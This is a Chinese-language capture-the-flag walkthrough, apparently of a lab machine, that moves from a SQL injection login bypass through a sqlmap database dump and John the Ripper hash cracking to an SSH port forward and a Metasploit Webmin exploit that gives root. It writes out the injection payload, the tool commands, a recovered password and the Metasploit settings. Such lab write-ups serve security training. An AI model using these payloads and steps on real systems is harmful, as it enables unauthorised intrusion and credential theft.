
需要用到sqlmap或者手注、破解用户哈希密码、使用 SSH 隧道显示隐藏服务以及使用 metasploit 有效负载获得 root 权限。

有个登录界面 用万能密码能登进去
```
' or 1=1;--  
```

是个搜索界面
![image.png](https://s2.loli.net/2025/04/19/7lIphPqOLicfZKF.png)

输了一个'之后会发现有个报错 我们可以考虑一下sql手注 或者sqlmap注入

## sql手注

先来试试手注 
```
构造and 1=1以及and 1=2
用于数字型注入点，

构造and '1' ='1'以及and '1' ='2'
用于字符型，

有报错就是存在
```



## sqlmap
bp抓包 将post复制下来进行爆破 --dump 能爆出账户和密码

![image.png](https://s2.loli.net/2025/04/19/kre4XsTnAPhqFyC.png)

```
sqlmap -r sql.txt -D db --tables
```

![image.png](https://s2.loli.net/2025/04/19/n2XRSuMpwTP1dsz.png)


john破解密码

```
john john.txt --format=RAW-SHA256 --wordlist=rockyou.txt 
```

![image.png](https://s2.loli.net/2025/04/19/Xnz5tl7LDPA8KVd.png)

## ssh反向隧道

反向 SSH 端口转发指定将远程服务器主机上的给定端口转发到本地端的给定主机和端口。


```
ss -tunlp
```
![image.png](https://s2.loli.net/2025/04/19/E2imDBtV6T1p4Xw.png)

有个10000端口 用 SSH 隧道，我们可以将端口公开给本地

```
ssh -L 10000:localhost:10000 agent47@10.10.120.156
```

![image.png](https://s2.loli.net/2025/04/19/bn9AYgRPjDEBNQy.png)

这个时候我们去访问localhost:10000就会有个页面

## msf攻击

```
search webmin 1.580
use 0
set USERNAME agent47
set PASSWORD videogamer124
set lhost vpn分配的ip
set ssl false
```

运行之后会生成会话 就是root权限